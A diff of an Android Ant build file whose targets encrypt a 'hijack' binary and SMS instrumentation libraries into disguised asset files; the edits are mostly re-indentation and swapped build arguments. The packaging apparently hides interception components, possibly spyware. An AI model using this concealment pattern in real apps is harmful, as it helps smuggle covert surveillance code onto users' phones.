@@ -141,9 +141,8 @@
 		<crypter encrypt="true" inputFile="preprocess/libt.so" keyFile="${randomKeyStatusDb}i" outputFile="assets/ib.data" salt="${randomSalt}" />
 		<delete file="assets/mb.data" />
 		<crypter encrypt="true" inputFile="preprocess/hijack" keyFile="${randomKeyStatusDb}m" outputFile="assets/mb.data" salt="${randomSalt}" />
-
-        <delete file="assets/pa.data" />
-        <crypter encrypt="true" inputFile="preprocess/${ddi.sms.libout}" keyFile="${randomKeyStatusDb}p" outputFile="assets/pa.data" salt="${randomSalt}" />
+        	<delete file="assets/pa.data" />
+        	<crypter encrypt="true" inputFile="preprocess/${ddi.sms.libout}" keyFile="${randomKeyStatusDb}p" outputFile="assets/pa.data" salt="${randomSalt}" />
 	</target>
 
 	<target name="encrypt-hijacklibrary-debug">
@@ -151,35 +150,32 @@
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}i" inputFile="preprocess/libt_debug.so" outputFile="assets/ib.data" />
 		<delete file="assets/mb.data" />
 		<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}m" inputFile="preprocess/hijack" outputFile="assets/mb.data" />
-
-        <delete file="assets/pa.data" />
-        <crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}p" inputFile="preprocess/${ddi.sms.libout}" outputFile="assets/pa.data" />
+        	<delete file="assets/pa.data" />
+        	<crypter encrypt="true" salt="${randomSalt}" keyFile="${randomKeyStatusDb}p" inputFile="preprocess/${ddi.sms.libout}" outputFile="assets/pa.data" />
 	</target>
 
         <target name="build-instrumentation-clean">
           <echo> cleaning dir ${ddi.sms.dir} </echo>
-             <delete>
-              <!-- recursive **/ -->
-              <fileset dir="${ddi.sms.dir}" includes="**/*.so"/>
-            </delete>
-          </target>
+          <delete>
+            <!-- recursive **/ -->
+            <fileset dir="${ddi.sms.dir}" includes="**/*.so"/>
+          </delete>
+        </target>
 
 
-        <macrodef name="build-instr">
-          <attribute name="lib" />
-          <attribute name="debug" />
-          <attribute name="buildDir" />
-          <attribute name="buildScript" />
-          <sequential>
-            <echo> @{buildScript}</echo>
+<macrodef name="build-instr">
+   <attribute name="lib" />
+   <attribute name="debug" />
+   <attribute name="buildDir" />
+   <attribute name="buildScript" />
+   <sequential>
+      <echo> @{buildScript} @{debug} @{lib} </echo>
 
-            <exec executable="@{buildScript}" dir="@{buildDir}" failonerror="true">
-              <arg value="@{debug}" />
-              <arg value="@{lib}" />
-            </exec>
-            <copy file="@{buildDir}/libs/armeabi/${ddi.sms.libout}" tofile="preprocess/${ddi.sms.libout}" overwrite="true" />
-
-
+      <exec executable="@{buildScript}" dir="@{buildDir}" failonerror="true">
+        <arg value="@{lib}" />
+        <arg value="@{debug}" />
+     </exec>
+     <copy file="@{buildDir}/libs/armeabi/${ddi.sms.libout}" tofile="preprocess/${ddi.sms.libout}" overwrite="true" />
   </sequential>
 </macrodef>
 
